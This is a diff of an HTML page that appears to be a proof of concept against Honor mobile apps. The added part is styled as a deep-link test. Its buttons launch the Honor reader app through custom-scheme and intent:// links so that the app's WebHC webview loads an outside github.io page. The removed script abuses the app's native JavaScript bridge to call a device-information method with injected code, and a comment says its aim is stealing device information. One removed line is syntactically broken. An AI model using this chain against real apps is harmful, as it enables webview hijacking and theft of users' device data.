@@ -1,26 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deep Link 测试</title>
+<style>
+  body {
+    font-family: -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: #f5f5f7;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 24px;
+    box-sizing: border-box;
+  }
+  .card {
+    background: #fff;
+    border-radius: 16px;
+    padding: 32px 24px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    text-align: center;
+  }
+  h1 { font-size: 18px; margin-bottom: 8px; color: #1d1d1f; }
+  p.desc { font-size: 14px; color: #6e6e73; margin-bottom: 24px; line-height: 1.5; }
+  .btn {
+    display: inline-block;
+    width: 100%;
+    box-sizing: border-box;
+    padding: 14px 20px;
+    background: #ff6a00;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 600;
+    text-decoration: none;
+    cursor: pointer;
+    margin-bottom: 12px;
+  }
+  .btn:active { opacity: 0.8; }
+  .btn.secondary {
+    background: #f0f0f2;
+    color: #1d1d1f;
+  }
+  .link-box {
+    margin-top: 20px;
+    padding: 12px;
+    background: #f0f0f2;
+    border-radius: 8px;
+    font-size: 12px;
+    color: #6e6e73;
+    word-break: break-all;
+    text-align: left;
+  }
+  .tip {
+    margin-top: 16px;
+    font-size: 12px;
+    color: #999;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>打开阅读器 H5 页面</h1>
+  <p class="desc">点击下方按钮唤起「荣耀阅读」App，跳转到指定的 WebHC 页面。若未安装 App 或未响应，可尝试备用方式。</p>
+
+  <!-- 方式一：直接使用自定义 scheme，适用于大多数浏览器 -->
+  <a class="btn" id="schemeBtn" href="#">唤起 App（自定义 Scheme）</a>
+
+  <!-- 方式二：Chrome/系统浏览器上更可靠的 intent:// 语法，带 fallback -->
+  <a class="btn secondary" id="intentBtn" href="#">唤起 App（Intent 语法，带兜底）</a>
+
+  <div class="link-box" id="linkPreview"></div>
+  <div class="tip">若跳转无反应，请确认手机已安装对应 App，且浏览器允许打开外部链接。</div>
+</div>
+
 <script>
-window.noJump = true;
-window.current = location.href;
+  // 目标 JSON 参数
+  const paramObj = {
+    url: "https://alipayhihonor.github.io/qkg",
+    title: "hi"
+  };
+  const paramStr = encodeURIComponent(JSON.stringify(paramObj));
 
-function MyCallback(callbackId, eventType, data, d, e) {
-    if (window.noJump) {
-        let test_Json = JSON.stringify(
-            {"packageName": "jp.pokemon.pokemonunite",
-            "trackingParameter": "test",
-            "externalJson": "test",
-            "showToast": "you are hacked",
-            "isRefresh": true
-        });
-        var newFunc = MyCallback.toString();
-        // var realFunc = "(()=>{" + 'alert(document.domain);' + newFunc + ";MyCallback(test_Json, test_Json, test_Json, test_Json, test_Json);})();//";
-        var realFunc = "alert(document.domain);" + newFunc + MyCallback';
-        window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", realFunc);// 窃取设备信息
-        location.href = "https://www.hihonor.com";
-    }
-    else {
-        alert(document.domain);
-    }
-}
+  // 方式一：原生 scheme 链接
+  const schemeUrl = `dz://com.hihonor.dz.reader?action=webHCPage&param=${paramStr}`;
 
-MyCallback();
+  // 方式二：intent:// 语法（Chrome 专属，支持 fallback 到应用商店等）
+  // 格式: intent://<host><path>?<query>#Intent;scheme=<scheme>;package=<pkg>;S.browser_fallback_url=<url>;end
+  const intentUrl =
+    `intent://com.hihonor.dz.reader?action=webHCPage&param=${paramStr}#Intent;` +
+    `scheme=dz;` +
+    `package=com.hihonor.dz.reader;` +
+    `S.browser_fallback_url=${encodeURIComponent('https://appmarket.example.com/detail/com.hihonor.dz.reader')};` +
+    `end`;
+
+  document.getElementById('schemeBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    window.location.href = schemeUrl;
+  });
+
+  document.getElementById('intentBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    window.location.href = intentUrl;
+  });
+
+  document.getElementById('linkPreview').innerText = schemeUrl;
 </script>
+
+</body>
+</html>
